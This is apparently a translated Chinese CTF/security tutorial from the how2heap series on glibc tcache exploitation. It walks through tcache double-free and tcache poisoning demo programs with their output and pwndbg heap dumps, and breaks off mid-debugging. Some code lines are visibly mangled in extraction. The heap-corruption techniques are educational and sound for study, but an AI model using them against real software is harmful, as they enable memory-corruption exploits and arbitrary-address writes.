# how2heap之完结篇
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
>
> 终于到了glibc2.26，本节包括tcache_dup,tcache_poisoning,tcache_house_of_spirit,house_of_spirit(乱入),house_of_botcake
PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂
## 参考网站
    https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/
    https://hackmd.io/@DIuvbu1vRU2C5FwWIMzZ_w/HkyVl98b8
## tcache_dup
###  序
glibc版本大于2.26之后，引入了tcache这一新机制，也完美展示了如何通过牺牲安全性来提升速度,当然可能也因为太不安全了,在2.29中就新增了保护机制,比如本文中的tcache
double free就在2.29中被命运扼住了咽喉,国内比赛2.29的题目比较少,但是国际上很多比赛早已引入2.29的题目
在分析漏洞利用demo时，我们先来看看这个tcache机制，这里也引入一篇之前总结的[文章](https://nightrainy.github.io/2019/07/11/tcache%E6%9C%BA%E5%88%B6%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/)  
，还有ctfwiki的关于tcache的[总结](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/)
有不想跳转的同学，我在这里也做一个解释
要注意的是新引入的tcache的优先级是高于fastbin的
PS：calloc是不会从tcache中拿chunk的
**关于tcache**
  1. tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk
  2. 64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次
  3. 这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)
**新的结构体**
在更新版本的时候，引入了两个新的结构体:tcahce_entry和tcache_perthread_struct,两个结构体的定义如下:
    +/* We overlay this structure on the user-data portion of a chunk when
    +   the chunk is stored in the per-thread cache.  */
    +typedef struct tcache_entry
    +{
    +  struct tcache_entry *next;
    +} tcache_entry;
    +
    +/* There is one of these for each thread, which contains the
    +   per-thread cache (hence "tcache_perthread_struct").  Keeping
    +   overall size low is mildly important.  Note that COUNTS and ENTRIES
    +   are redundant (we could have just counted the linked list each
    +   time), this is for performance reasons.  */
    +typedef struct tcache_perthread_struct
    +{
    +  char counts[TCACHE_MAX_BINS];
    +  tcache_entry *entries[TCACHE_MAX_BINS];
    +} tcache_perthread_struct;
    +
    +static __thread char tcache_shutting_down = 0;
    +static __thread tcache_perthread_struct *tcache = NULL;
从定义中可以看到，我们的tcache_entry为单链表结构
而tcache_perthread_struct为tcahch机制的主体，一个链表中内存块的最大数量为TCACHE_MAX_BINS即64
**新的函数**
于此同时，也新加了两个函数,tcache_get 和tcache_put
    +/* Caller must ensure that we know tc_idx is valid and there's room
    +   for more chunks.  */
    +static void
    +tcache_put (mchunkptr chunk, size_t tc_idx)
    +{
    +  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
    +  assert (tc_idx next = tcache->entries[tc_idx];
    +  tcache->entries[tc_idx] = e;
    +  ++(tcache->counts[tc_idx]);
    +}
    +
    +/* Caller must ensure that we know tc_idx is valid and there's
    +   available chunks to remove.  */
    +static void *
    +tcache_get (size_t tc_idx)
    +{
    +  tcache_entry *e = tcache->entries[tc_idx];
    +  assert (tc_idx entries[tc_idx] > 0);
    +  tcache->entries[tc_idx] = e->next;
    +  --(tcache->counts[tc_idx]);
    +  return (void *) e;
    +}
    +
从这两个函数中也可以看到开发者希望调用的人确保参数合法，这就2333  
我们可以看到在tcache_get中，我们唯一需要保证的就是tcache->entries[tc_idx] = e->next，这也就意味着安全性的急剧丧失
下面我们就直接看一下源代码
###  源代码
因为十分简单，所以我们简单一些
    #include 
    #include 
    int main()
    {
        //本demo是一个简单的利用tcache的double-free attack
        fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.n");
        fprintf(stderr, "Allocating buffer.n");
        int *a = malloc(8);
        fprintf(stderr, "malloc(8): %pn", a);
        fprintf(stderr, "Freeing twice...n");
        free(a);
        free(a);
        fprintf(stderr, "Now the free list has [ %p, %p ].n", a, a);
        fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].n", malloc(8), malloc(8));
        return 0;
    }
###  运行结果
    This file demonstrates a simple double-free attack with tcache.
    Allocating buffer.
    malloc(8): 0x56028230f260
    Freeing twice...
    Now the free list has [ 0x56028230f260, 0x56028230f260 ].
    Next allocated buffers will be same: [ 0x56028230f260, 0x56028230f260 ].
###  代码调试
这里就直接显示free后的状态吧
    pwndbg> bins
    tcachebins
    0x20 [  2]: 0x555555756260 ◂— 0x555555756260 /* '`buUUU' */
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
因为没有检查，因此可以看到我们连续free两次chunk就构造了一个循环
###  总结
我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以
这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了
然后我们再malloc两次就可以得到同一块内存的chunk
对本程序而言，程序先malloc了一个chunk a(size=8)
然后连续Freee两次chunk a,此时在free list中就会链入两次chunk a,
这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了
## tcache_poisoning
###  序
对于tcache来说，我们不需要像fastbin那样伪造一个size符合要求的地址来任意malloc，我们只需要直接覆盖fd指针就可以了
###  源代码
    #include 
    #include 
    #include 
    int main()
    {
        //此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）
        fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc inton"
               "returning a pointer to an arbitrary location (in this case, the stack).n"
               "The attack is very similar to fastbin corruption attack.nn");
        size_t stack_var;
        //我们想要返回的地址是stack_var
        fprintf(stderr, "The address we want malloc() to return is %p.n", (char *)&stack_var);
        fprintf(stderr, "Allocating 1 buffer.n");
        intptr_t *a = malloc(128);
        fprintf(stderr, "malloc(128): %pn", a);
        fprintf(stderr, "Freeing the buffer...n");
        free(a);
        fprintf(stderr, "Now the tcache list has [ %p ].n", a);
        //我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址
        fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %pn"
            "to point to the location to control (%p).n", sizeof(intptr_t), a, &stack_var);
        a[0] = (intptr_t)&stack_var;
        fprintf(stderr, "1st malloc(128): %pn", malloc(128));
        fprintf(stderr, "Now the tcache list has [ %p ].n", &stack_var);
        intptr_t *b = malloc(128);
        fprintf(stderr, "2nd malloc(128): %pn", b);
        fprintf(stderr, "We got the controln");
        return 0;
    }
###  运行结果
    This file demonstrates a simple tcache poisoning attack by tricking malloc into
    returning a pointer to an arbitrary location (in this case, the stack).
    The attack is very similar to fastbin corruption attack.
    The address we want malloc() to return is 0x7ffeeef34a50.
    Allocating 1 buffer.
    malloc(128): 0x5560af76b260
    Freeing the buffer...
    Now the tcache list has [ 0x5560af76b260 ].
    We overwrite the first 8 bytes (fd/next pointer) of the data at 0x5560af76b260
    to point to the location to control (0x7ffeeef34a50).
    1st malloc(128): 0x5560af76b260
    Now the tcache list has [ 0x7ffeeef34a50 ].
    2nd malloc(128): 0x7ffeeef34a50
    We got the control
###  关键代码调试
这次将断点下在了
       15     intptr_t *a = malloc(128);
     ► 16     fprintf(stderr, "malloc(128): %pn", a);
       18     free(a);
       19 
     ► 20     fprintf(stderr, "Now the tcache list has [ %p ].n", a);
     ► 23     a[0] = (intptr_t)&stack_var;
       28     intptr_t *b = malloc(128);
     ► 29     fprintf(stderr, "2nd malloc(128): %pn", b);
我们直接运行就好，首先我们申请了chunk a,此时的堆是这样的
    pwndbg> heap
    0x555555756000 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 593, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }